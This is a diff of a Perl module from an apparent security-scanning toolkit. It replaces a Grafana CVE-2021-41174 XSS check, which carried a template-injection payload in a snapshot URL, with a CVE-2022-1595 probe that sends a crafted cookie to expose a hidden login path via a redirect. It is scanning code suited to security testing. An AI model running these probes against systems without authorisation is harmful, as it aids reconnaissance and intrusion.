@@ -1,4 +1,4 @@
-package Spellbook::Advisory::CVE_2021_41174 {
+package Spellbook::Advisory::CVE_2022_1595 {
     use strict;
     use warnings;
     use Spellbook::Core::UserAgent;
@@ -6,7 +6,7 @@ package Spellbook::Advisory::CVE_2021_41174 {
 
     our $VERSION = '0.0.1';
 
-    Readonly my $HTTP_OK => 200;
+    Readonly my $HTTP_MOVED_PERMANENTLY => 301;
 
     sub new {
         my ($self, $parameters) = @_;
@@ -23,16 +23,11 @@ package Spellbook::Advisory::CVE_2021_41174 {
                 $target = "https://$target";
             }
 
-            if ($target =~ /\/$/xsm) {
-                chop $target;
-            }
-
             my $useragent = Spellbook::Core::UserAgent -> new();
-            my $snapshot_payload = 'dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1';
-            my $request = $useragent -> get ("$target/$snapshot_payload");
+            my $request = $useragent -> get ($target, 'Cookie' => 'valid_login_slug=1');
 
-            if (($request -> code() == $HTTP_OK) && ($request -> content() =~ /Grafana/xsm)) {
-                push @result, $target;
+            if ($request -> code() == $HTTP_MOVED_PERMANENTLY) {
+                push @result, $request -> header('Location');
             }
 
             return @result;
@@ -41,8 +36,8 @@ package Spellbook::Advisory::CVE_2021_41174 {
         if ($help) {
             return
                 "\n"
-              . "                \rAdvisory::CVE_2021_41174\n"
-              . "                \r========================\n"
+              . "                \rAdvisory::CVE_2022_1595\n"
+              . "                \r=======================\n"
               . "                \r-h, --help     See this menu\n"
               . "                \r-t, --target   Define a target\n\n\n";
         }
